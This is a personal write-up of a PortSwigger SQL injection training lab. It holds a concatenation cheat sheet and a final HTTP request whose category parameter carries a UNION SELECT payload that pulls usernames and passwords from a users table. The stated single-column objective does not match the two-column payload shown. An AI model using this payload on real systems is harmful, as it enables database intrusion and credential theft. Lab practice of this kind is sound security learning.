
#portswigger #solution #sqli

- **Category:** **SQL injection**
- **Difficulty:** PRACTITIONER
- **URL Lab:** https://portswigger.net/web-security/learning-paths/sql-injection
- **Date Solved:** 2026-08-02

---
Similar to [[SQL injection UNION attack]]
## 🎯 1. Lab Objective
> Perform an SQLi attack to retrieve the information from 'users' table, retrieving multiple values in a single column

==Cheatsheet:==

| String concatenation |                                                                                   |
| -------------------- | --------------------------------------------------------------------------------- |
| Oracle               | `'foo'\|'bar'`                                                                    |
| Microsoft            | `'foo'+'bar'`                                                                     |
| PostgreSQL           | `'foo'\|'bar'`                                                                    |
| MySQL                | `'foo' 'bar'` [Note the space between the two strings]  <br>`CONCAT('foo','bar')` |

---

## 🚀 2.  Exploitation


![[Pasted image 20260802143814.png]]
## ⚡ 3. PoC / Final Payload

```http
GET /filter?category=Gifts' UNION SELECT username, password FROM users -- HTTP/2
Host: 0a9800fe042444bc807926a100dc0050.web-security-academy.net
Cookie: session=OK9pyG0qXT5P15oPcpxlgybtoBRiVwEq
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a9800fe042444bc807926a100dc0050.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i




```
